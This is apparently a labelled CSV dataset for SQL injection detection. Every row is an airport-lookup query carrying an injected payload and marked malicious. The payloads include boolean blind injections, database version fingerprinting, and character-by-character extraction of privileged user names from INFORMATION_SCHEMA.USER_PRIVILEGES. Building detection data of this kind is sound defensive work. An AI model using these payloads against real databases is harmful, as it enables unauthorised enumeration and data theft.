full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = ""-8299 WHERE 6346=6346 OR 6466=9428-- LrmA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-5229 WHERE 4534=4534 OR 5415=5415-- oexu"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-4329)) AS jhwh WHERE 9996=9996 OR 8247=2812-- OWGK"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7756)) AS Ftio WHERE 9503=9503 OR 5415=5415-- XZml"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-7970) AS rKiP WHERE 3725=3725 OR 2731=2345-- XoHS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""-2122) AS onEL WHERE 8533=8533 OR 5415=5415-- czih"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') OR NOT 2361=4717-- JtoX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT') OR NOT 8124=8124-- ALiz"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' OR NOT 3593=7258-- ErTL"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT' OR NOT 8124=8124-- EyFW"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 2350=8669-- xZhq"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 8124=8124-- uEUX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 4185=6698-- LwCw"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 11=11-- SBJO"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 11=78-- speK"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 78=46-- LPWS"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 46=46-- AaSt"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 78 46-- GlPM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 20=20-- iSdI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 20=92-- gJWx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 92=78-- qkRx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 78=78-- jzAF"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 92 78-- MBdk"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 29=29-- rjJx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 29=75-- rkIN"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 75=55-- OrYQ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 55=55-- outR"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 75 55-- uhnU"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 47=47-- fEkE"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 47=74-- klEX"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 74=55-- CIRQ"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 55=55-- cORz"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 74 55-- ojvP"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 28=28-- Mbug"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 28=74-- OSeT"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 74=42-- rSLp"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 42=42-- zXjl"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 74 42-- JhYn"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 8222=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8222-- YaqU"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT (5624)=5624-- jHto"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT 5625>5624-- GRrn"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT QUARTER(NULL XOR NULL) IS NULL-- zXJI"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT SESSION_USER() LIKE USER()-- EGVp"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ISNULL(JSON_STORAGE_FREE(NULL))-- hqev"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT VERSION() LIKE 0x254d61726961444225-- evwE"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT VERSION() LIKE 0x255469444225-- gWOh"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT @@VERSION_COMMENT LIKE 0x256472697a7a6c6525-- sYvW"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT @@VERSION_COMMENT LIKE 0x25506572636f6e6125-- UHYx"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT AURORA_VERSION() LIKE 0x25-- XUsm"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>51-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>54-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>52-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),1,1))>53-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>51-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>48-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(COUNT(DISTINCT(grantee)) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.USER_PRIVILEGES),2,1))>9-- csUj"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>51-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>48-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>49-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>50-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>51-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>48-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>9-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>47-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>51-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>48-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>9-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>64-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>64-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>64-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>64-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>120-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>120-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>124-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>32-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>48-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>104-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>116-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>108-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>122-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>110-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>40-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>121-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>109-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>114-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>115-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>36-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>120-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>38-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>39-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>116-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>104-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>48-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>108-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>96-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>112-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>114-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>106-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>24-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>36-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>104-- ozsM"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>107-- ozsM"";",1,airport-S1,Unknown,Unknown
